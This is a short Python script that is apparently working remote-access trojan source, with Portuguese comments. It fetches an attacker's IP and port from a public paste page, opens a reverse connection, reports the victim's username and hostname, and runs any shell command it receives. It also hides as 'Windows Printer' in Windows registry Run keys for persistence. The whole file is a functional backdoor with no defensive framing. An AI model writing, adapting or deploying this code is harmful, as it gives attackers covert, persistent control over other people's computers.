#!/bin/env python3

import socket
import os
import platform
import subprocess
from time import sleep
import requests
from threading import Thread
from sys import argv


def shell(sock):
    global pathsys
    while True:
        cmd = sock.recv(1024)
        command = cmd.decode()
        output = b''
        if command == 'install autorun':
            if pathsys is not None:
                Thread(target=autorun, args=(pathsys,)).start()
        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output += proc.stdout.read()
            output += proc.stderr.read()
        output += b'\n[+] Executado'
        data = output.decode('latin-1').encode()
        sock.send(data)


def session(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        sock.send(f'{os.getlogin()}@{platform.node()}'.encode())
        shell(sock)
    except Exception:
        return 0


def autorun(file):
    sleep(60)
    try:
        if platform.system() == 'Windows':
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, 'Windows Printer', 0, winreg.REG_SZ, file)
            key2 = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key2, 'Windows Printer', 0, winreg.REG_SZ, file)
    except:
        pass


# Função principal
if __name__ == '__main__':
    pathsys = None
    if len(argv) >= 1:
        if os.path.exists(argv[0]):
            if os.path.isfile(argv[0]):
                pathsys = argv[0]
                Thread(target=autorun, args=(pathsys,)).start()
    while True:
        try:
            endpoint = requests.get('http://dontpad.com/hell0')
            if endpoint.status_code == 200:
                data = endpoint.text.split('<textarea id="text">')[1]
                data = data.split('</textarea>')[0]
                if ':' in data:
                    data = data.split(':')
                    if len(data) == 2:
                        ip = data[0]
                        if data[1].isnumeric():
                            port = int(data[1])
                            session(ip, port)
        except:
            pass
        sleep(10)
